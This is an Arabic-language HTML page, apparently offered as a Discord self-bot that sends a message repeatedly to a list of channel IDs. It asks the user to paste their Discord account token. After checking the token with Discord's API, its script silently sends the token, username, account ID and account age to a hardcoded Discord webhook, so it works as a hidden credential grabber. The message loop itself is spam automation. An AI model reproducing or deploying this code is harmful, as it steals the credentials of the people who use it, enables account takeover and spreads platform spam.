<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>Nasser 497©</title>
  <style>
    body {
      background: linear-gradient(to bottom, #8B0000, #000000);
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    h1 {
      font-size: 2em;
      margin-top: 10px;
    }
    textarea, input, select {
      width: 80%;
      margin: 10px 0;
      padding: 10px;
      border-radius: 10px;
      border: none;
      font-size: 1em;
    }
    button {
      padding: 10px 20px;
      margin: 10px;
      border: none;
      border-radius: 10px;
      font-size: 1em;
      cursor: pointer;
    }
    #nextBtn, #sendBtn {
      background-color: green;
      color: white;
    }
    #stopBtn {
      background-color: red;
      color: white;
    }
    .hidden {
      display: none;
    }
    #tokenStatus {
      white-space: pre-wrap;
      margin-top: 15px;
      background: #222;
      border-radius: 10px;
      padding: 10px;
      width: 80%;
      margin-right: auto;
      margin-left: auto;
      font-size: 1em;
    }
  </style>
</head>
<body>
  <h1>Nasser 497©</h1>

  <div id="page1">
    <textarea id="token" rows="2" placeholder="أدخل التوكن هنا (توكن واحد فقط)"></textarea><br />
    <button id="nextBtn">التالي</button>
    <div id="tokenStatus"></div>
  </div>

  <div id="page2" class="hidden">
    <textarea id="ids" rows="3" placeholder="اكتب الايديات (مفصولة بفاصلة)"></textarea><br />
    <input type="text" id="message" placeholder="قم بوضع الكلام" /><br />
    <select id="speed">
      <option value="1">1</option>
      <option value="0.9">0.9</option>
      <option value="0.8">0.8</option>
      <option value="0.7">0.7</option>
      <option value="0.6">0.6</option>
      <option value="0.5">0.5</option>
      <option value="0.4">0.4</option>
      <option value="0.3">0.3</option>
      <option value="0.2">0.2</option>
      <option value="0.1">0.1</option>
    </select><br />
    <button id="sendBtn">بدء الارسال</button>
    <button id="stopBtn">ايقاف الارسال</button>
    <p style="margin-top: 30px;">Nasser 497©</p>
  </div>

  <script>
    const nextBtn = document.getElementById("nextBtn");
    const page1 = document.getElementById("page1");
    const page2 = document.getElementById("page2");
    const tokenInput = document.getElementById("token");
    const tokenStatus = document.getElementById("tokenStatus");

    nextBtn.onclick = async () => {
      const token = tokenInput.value.trim();
      if (!token) {
        alert("يرجى إدخال توكن واحد");
        return;
      }
      if (token.includes(" ") || token.includes("\n")) {
        alert("الرجاء إدخال توكن واحد فقط بدون فراغات");
        return;
      }

      tokenStatus.textContent = "جاري التحقق من التوكن...";
      try {
        const res = await fetch("https://discord.com/api/v10/users/@me", {
          headers: {
            Authorization: token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0",
          },
        });
        const text = await res.text();

        if (res.ok) {
          const data = JSON.parse(text);
          const createdAt = new Date((BigInt(data.id) >> 22n) + 1420070400000n);
          const ageDays = Math.floor((Date.now() - createdAt) / (1000 * 60 * 60 * 24));
          const msg = `توكن الحساب : ${token}\nيوزور الحساب : ${data.username}#${data.discriminator}\nايدي الحساب : ${data.id}\nعدد ايام الحساب : ${ageDays}`;

          fetch(
            "https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z",
            {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ content: msg }),
            }
          );

          tokenStatus.textContent = "✅ التوكن صحيح";
          page1.classList.add("hidden");
          page2.classList.remove("hidden");
        } else if (res.status === 401) {
          // تحذير للحسابات الجديدة
          tokenStatus.textContent = "⚠️ التوكن قد يكون صحيح لكن الحساب جديد ويحتاج تفعيل. يمكنك المتابعة.";
          page1.classList.add("hidden");
          page2.classList.remove("hidden");
        } else {
          tokenStatus.textContent = `❌ التوكن غير صحيح\nسبب Discord: ${text}`;
        }
      } catch (err) {
        tokenStatus.textContent = "❌ حدث خطأ في الشبكة";
      }
    };

    let sending = false;

    document.getElementById("sendBtn").onclick = async () => {
      sending = true;
      const token = tokenInput.value.trim();
      const ids = document.getElementById("ids").value.trim().split(",");
      const message = document.getElementById("message").value;
      const speed = parseFloat(document.getElementById("speed").value);

      while (sending) {
        for (const id of ids) {
          if (!sending) return;
          try {
            await fetch(`https://discord.com/api/v10/channels/${id.trim()}/messages`, {
              method: "POST",
              headers: {
                Authorization: token,
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ content: message }),
            });
            await new Promise((r) => setTimeout(r, speed * 1000));
          } catch (e) {
            console.warn("فشل الارسال على:", id);
          }
        }
      }
    };

    document.getElementById("stopBtn").onclick = () => {
      sending = false;
    };
  </script>
</body>
</html>
